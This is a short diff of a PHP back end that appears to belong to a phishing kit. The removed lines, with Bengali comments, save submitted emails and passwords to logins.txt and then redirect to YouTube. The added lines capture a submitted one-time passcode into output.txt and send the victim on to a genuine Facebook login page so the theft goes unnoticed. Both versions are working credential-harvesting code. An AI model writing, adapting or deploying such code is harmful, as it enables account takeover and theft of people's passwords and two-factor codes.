@@ -1,22 +1,5 @@
 <?php
-// সরল PHP স্ক্রিপ্ট যা POST ডাটা গ্রহণ করে এবং ফাইলে সেভ করে।
 
-$email = $_POST['email'] ?? '';
-$password = $_POST['password'] ?? '';
-
-if (empty($email) || empty($password)) {
-    // যদি ফাঁকা হয়, ফিরে যাও index.html এ
-    header("Location: index.html");
-    exit;
-}
-
-// ফাইলে সেভ (logins.txt)
-$file = fopen("logins.txt", "a");
-fwrite($file, "Email: $email | Password: $password\n");
-fclose($file);
-
-// ইউজারকে অন্য সাইটে রিডাইরেক্ট
-header("Location: https://www.youtube.com");
+file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
+header('Location: https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2FJUST-FUN-106475094061167%2F%3Frefsrc%3Dhttps%253A%252F%252Fmbasic.facebook.com%252F106475094061167%252F%26_rdr&email=&li=FCR8Xy7eDhgQ8ZgEwp1wXIRH&e=1348092&shbl=1&ref=104&refsrc=https%3A%2F%2Fmbasic.facebook.com%2F106475094061167%2F&_rdr');
 exit();
-?>
-	
